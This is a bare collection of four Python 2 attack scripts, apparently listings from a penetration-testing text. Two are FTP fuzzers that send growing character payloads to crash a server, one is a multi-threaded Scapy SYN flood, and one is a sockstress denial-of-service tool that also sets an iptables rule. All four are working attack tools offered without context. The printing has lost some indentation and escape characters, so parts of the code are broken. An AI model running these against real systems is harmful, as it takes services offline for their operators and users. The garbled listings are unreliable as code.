["```\n        #!/usr/bin/python\n\n        import socket\n        import sys\n\n        if len(sys.argv) != 6:\n            print \"Usage - ./ftp_fuzz.py [Target-IP] [Port Number]\n             [Payload] [Interval] [Maximum]\"\n            print \"Example - ./ftp_fuzz.py 10.0.0.5 21 A 100 1000\"\n            print \"Example will fuzz the defined FTP service\n             with a series of payloads\"\n            print \"to include 100 'A's, 200 'A's, etc...\n             up to the maximum of 1000\"\n            sys.exit()\n\n        target = str(sys.argv[1])\n        port = int(sys.argv[2])\n        char = str(sys.argv[3])\n        i = int(sys.argv[4])\n        interval = int(sys.argv[4])\n        max = int(sys.argv[5])\n        user = raw_input(str(\"Enter ftp username: \"))\n        passwd = raw_input(str(\"Enter ftp password: \"))\n        command = raw_input(str(\"Enter FTP command to fuzz: \"))\n\n        while i <= max:\n            try:\n                payload = command + \" \" + (char * i)\n                print \"Sending \" + str(i) + \" instances of payload\n                 (\" + char + \") to target\"\n                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                connect=s.connect((target,port))\n                s.recv(1024)\n                s.send('USER ' + user + 'rn')\n                s.recv(1024)\n                s.send('PASS ' + passwd + 'rn')\n                s.recv(1024)\n                s.send(payload + 'rn')\n                s.send('QUITrn')\n                s.recv(1024)\n                s.close()\n                i = i + interval\n            except:\n                print \"nUnable to send...Server may have crashed\"\n                sys.exit()\n\n        print \"nThere is no indication that the server has crashed\"\n\n```", "```\n        #!/usr/bin/python\n\n        import socket\n        import sys\n\n        if len(sys.argv) != 5:\n            print \"Usage - ./ftp_fuzz.py [Target-IP]\n             [Port Number] [Interval] [Maximum]\"\n            print \"Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000\"\n            print \"Example will fuzz the defined FTP service\n             with a series of line break \"\n            print \"characters to include 100 'n's, 200 'n's,\n             etc... up to the maximum of 1000\"\n            sys.exit()\n\n        target = str(sys.argv[1])\n        port = int(sys.argv[2])\n        i = int(sys.argv[3])\n        interval = int(sys.argv[3])\n        max = int(sys.argv[4])\n        user = raw_input(str(\"Enter ftp username: \"))\n        passwd = raw_input(str(\"Enter ftp password: \"))\n        command = raw_input(str(\"Enter FTP command to fuzz: \"))\n\n        while i <= max:\n            try:\n                payload = command + \" \" + ('n' * i)\n                print \"Sending \" + str(i) + \" line break\n                 characters to target\"\n                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                connect=s.connect((target,port))\n                s.recv(1024)\n                s.send('USER ' + user + 'rn')\n                s.recv(1024)\n                s.send('PASS ' + passwd + 'rn')\n                s.recv(1024)\n                s.send(payload + 'rn')\n                s.send('QUITrn')\n                s.recv(1024)\n                s.close()\n                i = i + interval\n        except:\n            print \"nUnable to send...Server may have crashed\"\n            sys.exit()\n\n        print \"nThere is no indication that the server has crashed\"\n\n```", "```\n        #!/usr/bin/python\n\n        from scapy.all import *\n        from time import sleep\n        import thread\n        import random\n        import logging\n        logging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n\n        if len(sys.argv) != 4:\n        print \"Usage - ./syn_flood.py [Target-IP]\n         [Port Number] [Threads]\"\n        print \"Example - ./syn_flood.py 10.0.0.5 80 20\"\n        print \"Example will perform a 20x multi-threaded\n         SYN flood attack\"\n        print \"against the HTTP (port 80) service on 10.0.0.5\"\n        sys.exit()\n\n        target = str(sys.argv[1])\n        port = int(sys.argv[2])\n        threads = int(sys.argv[3])\n\n        print \"Performing SYN flood. Use Ctrl+C to stop attack.\"\n        def synflood(target,port):\n        while 0 == 0:\n        x = random.randint(0,65535)\n        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)\n\n        for x in range(0,threads):\n        thread.start_new_thread(synflood, (target,port))\n\n        while 0 == 0:\n        sleep(1)\n\n```", "```\n        #!/usr/bin/python\n\n        from scapy.all import *\n        from time import sleep\n        import thread\n        import logging\n        import os\n        import signal\n        import sys\n        logging.getLogger(\"scapy.runtime\").setLevel(logging.ERROR)\n\n        if len(sys.argv) != 4:\n        print \"Usage - ./sock_stress.py [Target-IP]\n         [Port Number] [Threads]\"\n        print \"Example - ./sock_stress.py 10.0.0.5 21 20\"\n        print \"Example will perform a 20x multi-threaded\n         sock-stress DoS attack \"\n        print \"against the FTP (port 21) service on 10.0.0.5\"\n        print \"n***NOTE***\"\n\n        print \"Make sure you target a port that responds\n         when a connection is made\"\n        sys.exit()\n\n        target = str(sys.argv[1])\n        dstport = int(sys.argv[2])\n        threads = int(sys.argv[3])\n\n        ## This is where the magic happens\n        def sockstress(target,dstport):\n        while 0 == 0:\n        try:\n        x = random.randint(0,65535)\n        response = sr1(IP(dst=target)\n        /TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)             send(IP(dst=target)\n        /TCP(dport=dstport,sport=x,window=0,flags='A',\n        ack=(response[TCP].seq + 1))/'x00x00',verbose=0)\n        except:\n        pass\n\n        ## Graceful shutdown allows IP Table Repair\n        def graceful_shutdown(signal, frame):\n        print 'nYou pressed Ctrl+C!'\n        print 'Fixing IP Tables'\n        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '\n         + target + ' -j DROP')\n        sys.exit()\n\n        ## Creates IPTables Rule to Prevent Outbound RST Packet\n         to Allow Scapy TCP Connections\n        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d '\n         + target + ' -j DROP')\n        signal.signal(signal.SIGINT, graceful_shutdown)\n\n        ## Spin up multiple threads to launch the attack\n        print \"nThe onslaught has begun...use Ctrl+C to\n         stop the attack\"\n        for x in range(0,threads):\n        thread.start_new_thread(sockstress, (target,dstport))\n\n        ## Make it go FOREVER (...or at least until Ctrl+C)\n        while 0 == 0:\n        sleep(1)\n\n```"]